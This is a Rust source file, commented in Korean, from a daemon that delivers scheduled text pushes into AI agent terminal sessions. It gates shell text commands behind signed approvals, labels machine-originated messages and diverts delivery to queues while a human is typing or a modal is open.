/// R-CLI-4: text_command 실행 前 게이트용 — 코드 소유 built-in 잡의 text_command와 정확히
/// 일치하는가(순수·회귀 핀). built-in 문자열이 조금이라도 변조되면 false로 떨어진다.
fn is_trusted_builtin_text_command(cmd: &str) -> bool {
    builtin_jobs()
        .iter()
        .any(|j| j.get("text_command").and_then(|v| v.as_str()) == Some(cmd))
}

/// R-CLI-4: text_command는 데몬이 셸로 실행하므로(schedule.json 편집자 = 임의 셸 실행 벡터) 실행
/// 前 게이트한다. ① 코드 소유 built-in 잡(팩·데몬 저작)의 text_command와 정확 일치 = 신뢰 허용.
/// ② 그 외(사용자·외부 주입·변조된 built-in) = 서명된 승인 레코드(approval.rs) 필요 — 부재 시
/// fail-closed 거부. 서명 시크릿 없이는 레코드 위조 불가라 무게이트 임의 셸 실행을 봉인한다.
fn text_command_allowed(cmd: &str) -> Result<(), String> {
    if is_trusted_builtin_text_command(cmd) {
        return Ok(());
    }
    let Some(secret) = crate::approval::signing_secret() else {
        return Err("text_command 승인 시크릿 부재 — 미승인 셸 실행 거부".into());
    };
    let records = crate::approval::load_records();
    let cwd = std::env::current_dir()
        .ok()
        .map(|p| p.to_string_lossy().to_string());
    if crate::approval::best_match(&records, &secret, cmd, cwd.as_deref(), &[]).is_some() {
        Ok(())
    } else {
        Err(format!(
            "미승인 text_command — built-in 아님·서명 승인 없음(임의 셸 실행 차단): {cmd}"
        ))
    }
}

/// text_command를 셸로 실행해 stdout(trim)을 반환한다 (push 텍스트 산출).
/// 결정론 환원: 진행% 같은 도구 출력을 데몬이 직접 만들어 master 앞에 놓는다.
/// 30초 타임아웃·빈 출력·비정상 종료는 에러 — 잘못된 보고가 무음 전달되지 않는다.
async fn run_text_command(cmd: &str) -> Result<String, String> {
    // R-CLI-4: 무게이트 셸 실행 차단 — built-in 신뢰 또는 서명 승인만 통과.
    text_command_allowed(cmd)?;
    // RC-11: OS별 셸 — Windows는 sh 부재라 heartbeat/report text_command job이 전부 실패했다.
    // fire_command와 동일하게 command_shell()(win=동봉 bash·미탐지 시 cmd) 사용으로 통일.
    let (sh, flag) = command_shell();
    let mut c = tokio::process::Command::new(sh);
    c.arg(flag).arg(cmd).hide_console();
    apply_spawn_env(&mut c); // 동봉 runtime PATH·HOME — 데몬 PATH 로는 python3/printf 미발견
    let fut = c.output();
    let out = match tokio::time::timeout(Duration::from_secs(30), fut).await {
        Ok(Ok(o)) => o,
        Ok(Err(e)) => return Err(format!("text_command spawn 실패: {e}")),
        Err(_) => return Err("text_command 30초 타임아웃".into()),
    };
    if !out.status.success() {
        let err = String::from_utf8_lossy(&out.stderr);
        return Err(format!(
            "text_command 비정상 종료({:?}): {}",
            out.status.code(),
            err.chars().take(200).collect::<String>()
        ));
    }
    // 성공(exit 0)이면 stdout만 push 텍스트로 쓴다. 보고 도구(javis_report)는 진단·실패도
    // stdout 보고문에 담도록 설계됐으므로(예: "cys status 수집 실패"), 성공 경로 stderr는
    // 부차적이라 무시한다 — 비정상 종료(exit≠0)는 위에서 이미 stderr와 함께 에러로 잡힌다.
    let s = String::from_utf8_lossy(&out.stdout).trim().to_string();
    if s.is_empty() {
        return Err("text_command 출력이 비어 있다".into());
    }
    Ok(s)
}

/// ★T-0147-2 층1 **I5 — 인벤토리 예외(명시)**.
///
/// 이 경로(schedule heartbeat inject)는 master stdin 주입자 전수 인벤토리의 I5 항목이고,
/// **W5 범위 밖**이다. 이유: 여기 실리는 잡은 오너가 직접 심은 전자동 사이클 메커니즘이라
/// 라우팅을 자율로 바꾸는 것은 '오너 결정 사항'(설계 §4 유지 리스크·자율 변경 경계)이다.
/// 그래서 **강등하지 않고 계수에서만 명시 제외**한다(M1 예외 예산 — 원장에는 그대로 남는다).
/// 침묵이 아니라 등재된 예외다: 인벤토리에 이름이 있고, 여기 주석이 그 사실을 코드에 못 박는다.
async fn fire_push(daemon: &Arc<Daemon>, job: &Job) -> Result<String, String> {
    let to = job.to.as_deref().ok_or("push job missing 'to'")?;
    // text 결정: text_command가 있으면 데몬이 실행해 stdout을 push 텍스트로 쓴다(결정론 환원).
    // 없으면 정적 text. 둘 다 없으면 에러.
    let text: String = if let Some(cmd) = job.text_command.as_deref() {
        // R2 codex medium: text_command 경로도 같은 셸을 쓰므로 폴백 경고를 동일 배선
        // (command_shell 은 OnceLock 캐시라 재호출 비용 없음).
        #[cfg(windows)]
        {
            let (_s, flag) = command_shell();
            warn_shell_fallback(daemon, flag);
        }
        run_text_command(cmd).await?
    } else {
        job.text
            .as_deref()
            .ok_or("push job missing 'text' or 'text_command'")?
            .to_string()
    };
    // ★R1 심층 방어(원장과 **독립인 2층**): 스케줄 push 는 정의상 기계 유래인데, 라벨 없는 문안
    //   (`--text "다음 액션 착수"`)이 그대로 master stdin 에 꽂히면 in-band 로는 오너 입력과
    //   구별할 수 없었다. 데몬이 발화 시점에 기계 라벨을 **강제 부착**한다 — 클라이언트가
    //   schedule.json 을 손으로 편집해도 우회할 수 없는 자리다(`cys schedule add` 는 파일을
    //   직접 쓰므로 CLI 검증만으로는 부족하다). 이미 라벨이 있는 문안(`[heartbeat] …`·`[wakeup] …`)
    //   은 건드리지 않는다 = 기존 잡 무회귀.
    let text = ensure_machine_label(&text, &job.id);
    let text = text.as_str();

    // fresh 모드: 살아있는 역할이 있어도 무조건 새 surface 기동 → 그 surface에 직접 주입.
    // 역할명은 유일 접미사로 변형 — 원 역할(예: worker)의 살아있는 주소를 탈취하지 않는다.
    // (지침 주입은 role prefix 매칭이라 worker-fresh-*도 WORKER_DIRECTIVE를 받는다)
    if job.fresh {
        let spec = job
            .launch
            .as_ref()
            .ok_or("fresh job requires 'launch' spec")?;
        let mut spec = spec.clone();
        spec.role = format!("{}-fresh-{}", spec.role, now_epoch() as u64);
        let sid = launch_via_cli(daemon, &spec).await?;
        // TTL: fresh surface 누수 차단 — 지정(또는 반복 job 기본) 시간 후 자동 close.
        // 원샷+fresh는 명시 시에만, 반복(time)+fresh는 미설정이어도 기본 TTL로 회수한다.
        // ★(0.14.31 · 리뷰 R1 · codex major) **기동 성공 직후·배달 시도 전**에 건다. 종전에는
        //   `deliver_push(...)?` 뒤였고, 큐 경유가 추가되며 실패 사유(늦은 pause·큐 포화·좌석
        //   소멸)가 늘어났다 — 그 조기 반환은 갓 띄운 좌석을 **회수 약속 없이** 남긴다
        //   (반복 잡이면 매 발화마다 좌석이 단조 누적된다 = 자원 누수).
        // ★(0.14.31 · WP-3 B) fresh 경로에도 같은 배달 선택을 적용한다 — 여기만 직접 주입으로
        //   남기면 `via_queue` 잡이 fresh 옵션 하나로 게이트를 통째 우회한다(같은 계약의 구멍).
        // 갓 띄운 좌석이 곧 대상이다 — 역할 결속은 이 잡의 계약이 아니다.
        //
        // ★(리뷰 R2 · claude minor) 회수 타이머는 **배달을 시도한 뒤** 건다. R1 에서 이 등록을
        //   `deliver_push` 앞으로 옮긴 이유는 "실패로 조기 반환해도 좌석을 회수한다" 였는데,
        //   `effective_close_ttl` 은 `close_after_secs: 0` 을 그대로 Some(0) 으로 돌리므로
        //   멀티스레드 런타임에서 회수가 배달을 **앞지를 수 있었다**(SeatGone·"surface gone").
        //   결과를 손에 쥔 채 등록하면 두 성질을 함께 얻는다: 순서(배달 시도가 먼저)와
        //   무조건성(성공·실패 어느 반환 경로에서도 회수가 걸린다).
        let delivered = deliver_push(daemon, job, sid, text, None);
        if let Some(ttl) = effective_close_ttl(job) {
            let d = Arc::clone(daemon);
            // ★(triage X9) 적재 성공(`"queued"`)은 **배달이 아니다**. 회수는 그 항목의 처분
            //   (배달·만료·폐기)이 정해진 뒤에 한다.
            // ★(0.14.41 · U8 P1) 직접 push 잡이 모달 때문에 우회 적재된 경우(`"queued(modal)"`)는 **종전 회수
            //   시각을 유지**한다 — 처분 대기로 늘리면 관문(모달)에 갇힌 fresh 좌석이 항목 TTL(6h)까지 살아 반복
            //   잡마다 누적될 수 있다(자원 상한 ①). 회수가 먼저 오면 그 항목은 `queue.dropped` 로 정직하게 남는다.
            let await_disposition = matches!(delivered, Ok("queued"));
            let job_id = job.id.clone();
            let timing = ReapTiming::for_job(ttl);
            tokio::spawn(async move {
                reap_fresh_seat(d, sid, job_id, timing, await_disposition).await;
            });
        }
        let how = delivered?;
        return Ok(format!("fresh-launched and {how} (surface:{sid})"));
    }
    let mut sid = daemon.roles.lock().unwrap().get(to).copied();
    // 이 sid 가 **역할 맵에서** 나왔는가(=적재 시점 재검증 대상인가). `if_absent:launch` 로
    // 새로 만든 좌석은 sid 자체가 대상이라 가드를 걸지 않는다.
    let mut from_role_map = sid.is_some();
    // 대상 surface가 죽어 있거나 agent-backed가 아니면(빈 셸) 부재로 간주.
    // agent_meta=None인 surface(new-surface로 만든 빈 zsh 셸)에 자연어 프롬프트를 push하면
    // 셸이 명령으로 해석해 깨진다(예: '[heartbeat]…' → zsh no matches). launch-agent로 등록된
    // 에이전트 pane만 유효 대상 → 빈 셸은 if_absent 규칙으로 처리(owner 보고는 skip).
    if let Some(s) = sid {
        // ★(0.14.31 · 리뷰 R2) 판정은 `alert_route::seat_is_agent_backed` **한 곳**이다.
        //   종전에는 같은 규칙을 여기 인라인으로 복제했고, 경보 라우팅이 그 사본과 갈라져
        //   빈 셸을 목적지로 골랐다. 술어가 하나면 갈라질 수 없다(그 술어는 등록 이력만이
        //   아니라 이미 관측된 부재 증거까지 본다 — Unknown 은 종전대로 통과).
        let valid = daemon
            .get_surface(s)
            .map(|surf| crate::alert_route::seat_is_agent_backed(&surf))
            .unwrap_or(false);
        if !valid {
            sid = None;
            from_role_map = false;
        }
    }

    if sid.is_none() {
        // 값 정규화(trim+소문자) — JSON 직접 편집의 "Skip"·" launch "도 의도대로 처리.
        let if_absent = job
            .if_absent
            .as_deref()
            .map(|s| s.trim().to_ascii_lowercase());
        match if_absent.as_deref() {
            Some("launch") => {
                let spec = job
                    .launch
                    .as_ref()
                    .ok_or("if_absent=launch but no 'launch' spec")?;
                sid = Some(launch_via_cli(daemon, spec).await?);
            }
            // skip: 대상 역할 부재 시 조용히 건너뛴다(Ok) — 에러로 기록하지 않는다.
            // 5분 보고 하트비트처럼 master가 평시 안 떠 있을 수 있는 job이 schedule.error를
            // 매 주기 쌓는 것을 차단한다(보고 '누락'은 무해, '에러 누적'은 모니터링 오염).
            Some("skip") => return Ok(format!("skipped: role '{to}' absent (if_absent=skip)")),
            // 미설정: 의도 불명 — 기존대로 에러로 알린다(설정 누락을 숨기지 않는다).
            _ => return Err(format!("role '{to}' absent (set if_absent=launch|skip)")),
        }
    }
    let sid = sid.ok_or_else(|| format!("role '{to}' absent"))?;
    let guard = from_role_map.then(|| crate::alert_route::RoleGuard::Exact(to));
    let how = deliver_push(daemon, job, sid, text, guard)?;
    Ok(format!("{how} to {to} (surface:{sid})"))
}

/// ★(0.14.31 · WP-3 B) 대상 좌석이 확정된 **뒤** 배달 방식을 고른다 — 큐 경유 또는 직접 주입.
///
/// 대상 선택(`fresh`·`if_absent`·빈 셸 판정)은 **위에서 이미 끝났다**: 그 앞에 끼워 넣으면
/// 기존 잡들의 대상 의미가 조용히 바뀐다. 반대로 마지막 `inject` 한 곳만 바꾸면 `fresh` 경로가
/// 게이트를 계속 우회한다 — 그래서 두 주입 지점이 **같은 이 함수**를 부른다.
///
/// 큐 경유는 배달 원장을 여기서 쓰지 않는다: 큐 배달 경로가 선기록(origin `queue`)과 영수증을
/// 자기 시점에 남긴다(여기서 `record_audited` 를 또 하면 한 발화가 원장에 두 번 남는다).
/// 큐 포화·좌석 소멸은 **에러**다 — 성공으로 보고하면 발화가 사라진 사실이 묻힌다.
///
/// 【`role_guard`】 대상 sid 를 **역할 맵에서 골랐다면** 적재 시점에 그 결속이 아직 유효한지
/// 다시 본다(리뷰 R1 · codex 추가지적). 역할 조회와 적재가 다른 트랜잭션이라, 그 사이에
/// `claim_role` 인계가 끝나면 정기 점검이 **버려진 셸**로 들어간다. 갓 띄운 좌석(`fresh`·
/// `if_absent:launch`)은 sid 자체가 대상이므로 가드를 걸지 않는다(걸면 launch 직후의
/// 등록 지연이 곧 실패가 된다).
fn deliver_push(
    daemon: &Arc<Daemon>,
    job: &Job,
    sid: u64,
    text: &str,
    role_guard: Option<crate::alert_route::RoleGuard<'_>>,
) -> Result<&'static str, String> {
    if !job.uses_queue() {
        // ★(0.14.31 · 리뷰 R2 · claude minor) 직접 주입 분기도 **같은 역할 가드**를 받는다.
        //   종전에는 큐 경유 분기에만 가드가 있었고, 그래서 기존 builtin push(하트비트 등)는
        //   선택과 주입 사이의 인계 경쟁이 그대로였다 — 인계가 끝난 뒤 구 좌석에 주입하면
        //   그 문안은 버려진 셸에 타이핑된다.
        //   좌석 조회와 역할 재검증을 **한 임계영역**에서 하고(락 순서 surfaces → roles =
        //   `close_surface`·`claim_role` 과 동순), 그렇게 확정한 `Arc<Surface>` 로 주입한다.
        //   ★정직한 한계: PTY 쓰기까지 락을 쥘 수는 없으므로(원장 I/O·writer 채널) 검증
        //   **직후**의 인계는 여전히 지나간다. 큐 경유 경로도 삽입 이후에는 같은 성질이다.
        let surface = resolve_push_target(daemon, sid, role_guard)?;
        // ★(0.14.42 · 설계 H2 · U8 P1 확장) 주입 직전 **양성 관측된 하드축**만 본다(공용 판정 H0).
        //   · pause(틱 확인과 push 사이의 늦은 kill-switch · ⓒ) → Err(delivery_frozen) — 주입도 적재도 없다.
        //   · 모달(종전 U8 P1)·quiescing(사이클 창)·사람 입력 30s·화면 초안 → 좌석 큐로 **우회**한다. 큐 게이트가
        //     같은 술어로 그 축이 풀린 뒤 배달한다(quiescing 창은 H1 이 붙잡는다). 1발화 = 큐 1항목 · 같은 잡
        //     발신은 병합 · 보호선 [`SCHEDULE_FALLBACK_HEADROOM`](50) · 주기 잡 TTL ≤ 주기(대기 1회분).
        //   · 관측 불능(마커 미정의·커서행 미관측·alt 파손·계수 단독)과 판정 패닉은 **종전 직접 주입**이다 — UI 가
        //     깨져도 하트비트·wakeup·자기 예약 wake 의 생명선이 끊기지 않는다(③). 시간 면제(ceiling)는 없다(§8-3).
        //   · busy(작업 중)는 막지 않는다(잔여) — §8 안에서 막는 유일한 방법이 큐 보류이고 그것이 ③ 을 만든다.
        //   · 셸 단독 축은 넣지 않는다(대상 선택의 `seat_is_agent_backed` 가 이미 본다).
        //   · ★(리뷰 F1 · RR1-F1-XSOCK · ③) 기계 소유로 입증된 초안(CLI 기계 send 의 Return 누락 잔여 — 검증 좌석 · 교차 소켓
        //     자기신고 · 익명 command 잡 · 데몬 자신의 붙여넣기)은 초안 축이
        //     아니다(H0 `draft_machine_owned`) — 종전(pre-H)처럼 직접 주입해 잔여를 병합 제출한다. 큐는 입력줄 점유를
        //     스스로 비우지 않아, 우회하면 푸는 주체 없이 heartbeat·wakeup 이 무기한 침묵한다.
        //   · fresh 잡은 pause 재확인과 기존 모달만 본다(새 축 없음 · 회수 타이머 의미 무변경).
        //   노브(`CYS_MACHINE_INJECT_HOLD` 에서 schedule 제외)면 종전 U8 P1 과 byte-identical 이다(상한 100 · TTL 없음).
        if crate::governance::machine_hold_enabled(crate::governance::MachineInjector::Schedule) {
            use crate::governance::MachineHold as H;
            let hold = crate::governance::machine_direct_hold(daemon, &surface, schedule_hold_axes(job.fresh));
            // ★(R3SH-1 · R3SH-2) 초안 우회 추적 — 초안이 아닌 판정은 이 잡의 연속 기록을 끊는다.
            let draft_step = match hold {
                Some(H::Draft) => Some(draft_divert_step(daemon, &surface, job)),
                _ => {
                    draft_divert_reset(daemon, sid, &job.id);
                    None
                }
            };
            match hold {
                Some(H::Paused) => return Err(SCHEDULE_FROZEN_ERR.to_string()),
                // ★(R3SH-1) 입증 못 한 기계 모양 초안 위에서 연속 우회 상한을 넘겼다 — 종전(pre-H) 직접 주입(유계 폴백).
                Some(H::Draft) if draft_step == Some(DraftStep::Fallback) => {}
                Some(h @ (H::Modal | H::Quiescing | H::HumanActive | H::Draft)) => {
                    let label = match h {
                        H::Modal => "queued(modal)",
                        H::Quiescing => "queued(gate:quiescing)",
                        H::HumanActive => "queued(gate:human)",
                        _ => "queued(gate:draft)",
                    };
                    let enqueued = enqueue_schedule_divert(
                        daemon,
                        job,
                        sid,
                        text,
                        role_guard,
                        SCHEDULE_FALLBACK_HEADROOM,
                        schedule_divert_ttl_secs(job),
                    )?;
                    if h == H::Draft {
                        draft_divert_note_starved(daemon, &surface, job);
                    }
                    return Ok(if enqueued { label } else { "queued(dedup)" });
                }
                Some(H::ShellOnly | H::ProbeFailed) | None => {}
            }
        } else if crate::governance::seat_modal_foreground(&surface) {
            // ★(0.14.41 · U8 P1 · 노브로 복원한 종전 경로) 모달 전경이면 좌석 큐로 우회(상한 100 · 데몬 기본 TTL).
            return enqueue_schedule_push(daemon, job, sid, text, role_guard, SCHEDULE_QUEUE_CAP, None)
                .map(|_| "queued(modal)");
        }
        // ★(0.14.43 · C8) 인계에 성공하면 `inject_on` 이 입력줄 계수를 "제출됨(0)" 으로 계상한다 — 계수가 실제로 0 이 아닌 값에서 내려갔을 때만 관측 이벤트 1건
        //   (보류·전환 판정은 위 H0 가 이미 끝냈다 · 이 계상은 어떤 게이트도 바꾸지 않는다).
        if let Some(cleared) = inject_on(daemon, &surface, text)? {
            note_push_cleared_pending(daemon, &surface, job, cleared);
        }
        return Ok("pushed");
    }
    enqueue_schedule_push(daemon, job, sid, text, role_guard, SCHEDULE_QUEUE_CAP, None).map(|_| "queued")
}

/// ★(0.14.42 · 설계 H2) 스케줄 직접 push 가 보는 하드축. 사람 입력 창은 큐 배달 게이트와 같은 값
/// (`CYS_QUEUE_HUMAN_QUIET_SECS` · 기본 30s). fresh 잡은 pause·모달만(갓 띄운 좌석 · 새 축 없음).
fn schedule_hold_axes(fresh: bool) -> crate::governance::MachineHoldAxes {
    use crate::governance::MachineHoldAxes;
    if fresh {
        return MachineHoldAxes { pause: true, modal: true, ..MachineHoldAxes::NONE };
    }
    MachineHoldAxes {
        pause: true,
        quiescing: true,
        human: true,
        modal: true,
        draft: true,
        human_window_secs: crate::governance::queue_human_quiet_secs(),
        ..MachineHoldAxes::NONE
    }
}

/// ★(0.14.42 · 설계 H2) 하드축 우회 항목의 TTL — 주기 잡은 `min(주기, 데몬 기본)` 이라 대기가 1회분으로 묶인다
/// (다음 회차가 새 문안으로 다시 적재하고, 만료분은 만료 큐로 간다). 원샷(at)·일일(time) 잡은 `None`(데몬 기본 6h).
/// 운영자가 데몬 TTL 을 껐으면(0) 그 선택을 따른다(`None` = 상속). 주기 0(비활성 잡의 run-now)은 원샷과 같다.
fn schedule_divert_ttl_secs(job: &Job) -> Option<u64> {
    // ★(0.14.42 · R3SH-5 ①) 자기 예약 원샷 wake(`at`)는 발화 시점에 파일에서 지워져 **다시 오지 않는다** — 우회 항목이
    //   데몬 기본 TTL(6h)로 만료되면 그 wake 는 조용히 사라진다(오너 밤샘 부재 = 초안 보류 6h 초과). 만료 없음(0)으로
    //   두고 초안이 풀리면 배달한다. 같은 잡의 대기는 1회분이라(R1-F3 적재 중복 제거) 쌓이지 않는다.
    //   fresh 원샷은 제외한다 — 회수 타이머가 미처분 항목을 기다리므로 만료 없는 항목이면 갓 띄운 좌석이 영영 회수되지 않는다.
    if job.at.is_some() && !job.fresh && job.every_minutes.filter(|m| *m > 0).is_none() {
        return Some(0);
    }
    let period = job.every_minutes.filter(|m| *m > 0)?.saturating_mul(60);
    let base = crate::state::queue_ttl_default_secs();
    (base > 0).then(|| period.min(base))
}

/// ★(0.14.42 · R1-F3) 하드축 우회 적재 — **같은 잡의 미배달 항목이 이미 이 좌석 큐에 있으면 새로 싣지 않는다**
/// (`Ok(false)`). 반환 `Ok(true)` = 적재함.
///
/// 【왜】 주기 잡 TTL 을 주기로 묶어도(대기 1회분) 다음 회차 발화가 만료 패스보다 먼저 오면 같은 잡의 옛 항목과 새 항목이
/// 함께 산다(적재 시점 중복 제거 없음). 한 좌석을 겨누는 주기 잡이 26개를 넘으면 전체 깊이 보호선 50 을 넘겨 회차마다
/// `schedule.error(queue_full)`·`queue.depth_high` 가 났다(S1 실측). 같은 잡 발신의 병합은 배달 때 다이제스트로만 일어났다.
/// 옛 항목을 남기는 이유: 치환(삭제 + 새 적재)은 인계 예약·묘비·원장 규약을 모두 다시 지나야 하는 새 삭제 경로다 — 남는
/// 항목은 제 TTL(≤ 주기)로 만료되고 다음 회차가 새 문안으로 다시 싣는다(최대 1주기 낡음 · 유실 0).
fn enqueue_schedule_divert(
    daemon: &Arc<Daemon>,
    job: &Job,
    sid: u64,
    text: &str,
    role_guard: Option<crate::alert_route::RoleGuard<'_>>,
    cap: usize,
    ttl_secs: Option<u64>,
) -> Result<bool, String> {
    let from = format!("{SCHEDULE_QUEUE_ORIGIN}:{}", job.id);
    if let Some(s) = daemon.get_surface(sid) {
        let q = s.pending_queue.lock().unwrap_or_else(|e| e.into_inner());
        if q.iter().any(|e| e.from.as_deref() == Some(from.as_str())) {
            return Ok(false);
        }
    }
    enqueue_schedule_push(daemon, job, sid, text, role_guard, cap, ttl_secs).map(|_| true)
}

/// ★(R3SH-1) 초안 우회 추적의 판정.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum DraftStep {
    /// 초안을 지킨다(큐 우회).
    Divert,
    /// 연속 우회 상한을 넘긴 기계 모양 초안 — 직접 주입(pre-H).
    Fallback,
}

/// (데몬 소켓, 좌석, 잡) → 연속 초안 우회 기록. 휘발(재기동 = 새로 센다 = 보수 방향).
#[derive(Debug, Clone)]
struct DraftDivert {
    /// 기록을 시작한 입력 세대 — 입력줄이 변하면(제출·사람 키·주입) 새 기록이다.
    gen: u64,
    count: u32,
    since: std::time::Instant,
    fallback_noted: bool,
    starved_noted: bool,
}

type DraftDivertKey = (std::path::PathBuf, u64, String);

fn draft_diverts() -> &'static std::sync::Mutex<HashMap<DraftDivertKey, DraftDivert>> {
    static M: std::sync::OnceLock<std::sync::Mutex<HashMap<DraftDivertKey, DraftDivert>>> = std::sync::OnceLock::new();
    M.get_or_init(Default::default)
}

fn draft_divert_reset(daemon: &Arc<Daemon>, sid: u64, job_id: &str) {
    let mut m = draft_diverts().lock().unwrap_or_else(|e| e.into_inner());
    m.remove(&(daemon.socket_path.clone(), sid, job_id.to_string()));
}

/// ★(R3SH-1) 초안 판정 1회를 기록하고 이번 회차의 처리를 고른다.
///
/// 폴백 조건(전부): 주기 잡 ∧ 사람 바이트 0(GUI 로 친 오너 글자가 아님) ∧ 같은 입력 세대 ∧ 기록 시작 뒤 사람 입력 없음 ∧
/// 연속 [`SCHEDULE_DRAFT_DIVERT_MAX`] 회 초과. 원샷은 폴백하지 않는다(만료 없는 우회 항목으로 기다린다 — R3SH-5).
/// 실패 방향: 입력줄이 변하거나 사람이 손대면 기록이 새로 시작된다(보류 쪽) · 폴백은 pre-H 동작(병합 제출)이지 새 거동이 아니다.
fn draft_divert_step(daemon: &Arc<Daemon>, surface: &Arc<crate::state::Surface>, job: &Job) -> DraftStep {
    let gen = surface.input_gen.load(std::sync::atomic::Ordering::Acquire);
    let human_bytes = surface.pending_input.lock().unwrap_or_else(|e| e.into_inner()).human;
    let last_human = *surface.last_human_input.lock().unwrap_or_else(|e| e.into_inner());
    let periodic = job.every_minutes.is_some_and(|m| m > 0);
    let key = (daemon.socket_path.clone(), surface.id, job.id.clone());
    let (count, first_fallback) = {
        let mut m = draft_diverts().lock().unwrap_or_else(|e| e.into_inner());
        let now = std::time::Instant::now();
        let rec = m.entry(key).or_insert(DraftDivert {
            gen,
            count: 0,
            since: now,
            fallback_noted: false,
            starved_noted: false,
        });
        let touched = last_human.is_some_and(|t| t > rec.since);
        if rec.gen != gen || touched {
            *rec = DraftDivert { gen, count: 0, since: now, fallback_noted: false, starved_noted: false };
        }
        rec.count = rec.count.saturating_add(1);
        let fallback = periodic && human_bytes == 0 && rec.count > SCHEDULE_DRAFT_DIVERT_MAX;
        let first = fallback && !rec.fallback_noted;
        if fallback {
            rec.fallback_noted = true;
        }
        (if fallback { Some(rec.count) } else { None }, first)
    };
    let Some(n) = count else {
        return DraftStep::Divert;
    };
    if first_fallback {
        daemon.bus.publish(
            "schedule.draft_fallback",
            "schedule",
            Some(surface.id),
            json!({"job_id": job.id, "surface_id": surface.id, "consecutive_diverts": n - 1,
                   "note": "입력줄의 초안이 사람 입력 없이 같은 채로 연속 우회 상한을 넘겼다(사람 바이트 0 — 기계 잔여로 추정) — \
                            종전(pre-H)처럼 직접 주입해 병합 제출한다(heartbeat·wakeup 무기한 침묵 차단)"}),
        );
    }
    DraftStep::Fallback
}

/// ★(0.14.42 · R3SH-2 (c)) 초안 우회가 기아 임계(`CYS_QUEUE_STARVE_ALERT_SECS` · 기본 600s) 이상 이어지면 `queue.starved` 를
/// 보류 에피소드(같은 입력 세대)마다 1회 낸다. 우회 항목은 TTL ≤ 주기(5분)로 만료·재적재되므로 머리 나이 기준의 틱 경보가
/// 영영 나지 않았다 — 오너가 초안을 남기고 자리를 비운 동안 주기 신호 전체가 멈춘 사실이 보이지 않았다. 발행뿐(자동 조치 없음).
fn draft_divert_note_starved(daemon: &Arc<Daemon>, surface: &Arc<crate::state::Surface>, job: &Job) {
    let threshold = crate::governance::queue_starve_alert_secs();
    if threshold == 0 {
        return;
    }
    let waited = {
        let mut m = draft_diverts().lock().unwrap_or_else(|e| e.into_inner());
        let Some(rec) = m.get_mut(&(daemon.socket_path.clone(), surface.id, job.id.clone())) else {
            return;
        };
        let waited = rec.since.elapsed().as_secs();
        if rec.starved_noted || waited < threshold {
            return;
        }
        rec.starved_noted = true;
        waited
    };
    let (head, depth) = {
        let q = surface.pending_queue.lock().unwrap_or_else(|e| e.into_inner());
        match q.front().cloned() {
            Some(h) => (h, q.len()),
            None => return,
        }
    };
    let role = surface.role.lock().unwrap_or_else(|e| e.into_inner()).clone();
    // ★(0.14.43 · C5 · RQFIX) 좌석 진단 스냅샷 — 큐 락은 위 블록에서 이미 놓았다(파서·어댑터 읽기는 큐 락 밖). 이 사유(`schedule_divert(gate:draft …`)는
    //   `queue_remedy` 표의 **입력줄 계열**(`governance::blocked_is_input_line`)이라 계수·입력줄 가시성에 따라 3~9행(초안·기계 잔여·유령 계수 등)의 처방이 나간다 —
    //   진단 값은 실측이다. 그 밖의 `schedule_divert` 꼴(`gate:draft` 가 아닌 것)은 16행 `unknown`.
    let diag = crate::governance::queue_block_diag(daemon, surface);
    daemon.bus.publish(
        "queue.starved",
        "queue",
        Some(surface.id),
        crate::state::queue_starved_payload(
            &cys::surface_ref(surface.id),
            role,
            &head,
            waited,
            depth,
            &format!("schedule_divert(gate:draft · job {})", job.id),
            &diag,
        ),
    );
}

/// 스케줄 발화의 **좌석 큐 적재** 한 벌 — 큐 경유 잡과 모달 우회(U8 P1)가 같은 인자·같은 동결 규약을 쓴다.
fn enqueue_schedule_push(
    daemon: &Arc<Daemon>,
    job: &Job,
    sid: u64,
    text: &str,
    role_guard: Option<crate::alert_route::RoleGuard<'_>>,
    cap: usize,
    ttl_secs: Option<u64>,
) -> Result<(), String> {
    crate::alert_route::enqueue_into_seat(
        daemon,
        sid,
        text.to_string(),
        // ★(0.14.31 · 리뷰 R1 · claude minor) 발신 라벨은 **그 잡** 이다. 종전에는 데몬 경보의
        //   `"daemon"` 을 그대로 넘겨, 원장(`delivery::split_queue_from` → `from_label`)에
        //   스케줄 발화가 데몬 경보로 찍혔다 — 스케줄 축으로 집계하는 소비자에게는 이 잡의
        //   발화가 보이지 않았다. surface ref 형식이 아니므로 `from_label` 로 간다(§8 준수).
        Some(format!("{SCHEDULE_QUEUE_ORIGIN}:{}", job.id)),
        SCHEDULE_QUEUE_ORIGIN,
        cap,
        role_guard,
        // ★(성찰 A14) 스케줄 push 는 **kill-switch 만** 늦은 동결로 본다. 좌석 pause(헬스 조치
        //   `pause-queue`)는 배달을 미룰 뿐이고 항목은 큐에서 기다린다 — 그것을 실패로 접으면
        //   이 회차가 `schedule.fired` 에서 에러로 종결돼 다음 주기까지 일감이 오지 않는다.
        //   경보(`enqueue_alert`)는 반대다: 보류해도 잃지 않으므로 판정과 같은 술어를 쓴다.
        crate::alert_route::FreezeGuard::Daemon,
        ttl_secs,
    )
    .map(|_| ())
    .map_err(|e| format!("via_queue enqueue failed: {}", e.as_str()))
}

/// 선두 라벨(`[...]`) 유무 판정 — 판독자 `javis_mission._label_head` 와 **같은 규칙**이다:
/// 선행 공백과 투명문자(Cf: ZWSP/ZWNJ/ZWJ/BOM/word-joiner 등)를 벗긴 뒤 첫 글자가
/// `[`(U+005B) 또는 전각 `［`(U+FF3B) 이면 라벨이다. **길이 상한은 두지 않는다** —
/// 종전 80자 창은 그 자체가 공격 표적이었다(80자 넘는 라벨로 우회).
///
/// ★정직한 한계: 투명문자 집합은 python 쪽이 `unicodedata` 로 Cf **전체**를 보는 반면 여기는
///   실사용 목록만 열거한다. 두 판정은 **독립 층**이라(여기=부착 강제 / python=수신 판별)
///   불일치의 결과는 "이미 라벨인 문안에 라벨을 한 번 더 붙일 뻔한다" 정도이고, 그마저도
///   양쪽 목록에 없는 희귀 Cf 로 시작하는 문안에서만 일어난다 — 안전 방향의 차이다.
fn has_machine_label(text: &str) -> bool {
    for ch in text.chars() {
        if ch.is_whitespace() {
            continue;
        }
        // Cf(format)·zero-width 류: 눈에 안 보이는 선두 문자로 라벨 판정을 비껴가는 우회 차단.
        if matches!(ch, '\u{200b}'..='\u{200f}' | '\u{2060}'..='\u{2064}' | '\u{feff}' | '\u{00ad}' | '\u{061c}' | '\u{180e}' | '\u{2066}'..='\u{2069}' | '\u{202a}'..='\u{202e}')
        {
            continue;
        }
        return ch == '[' || ch == '\u{ff3b}';
    }
    false
}

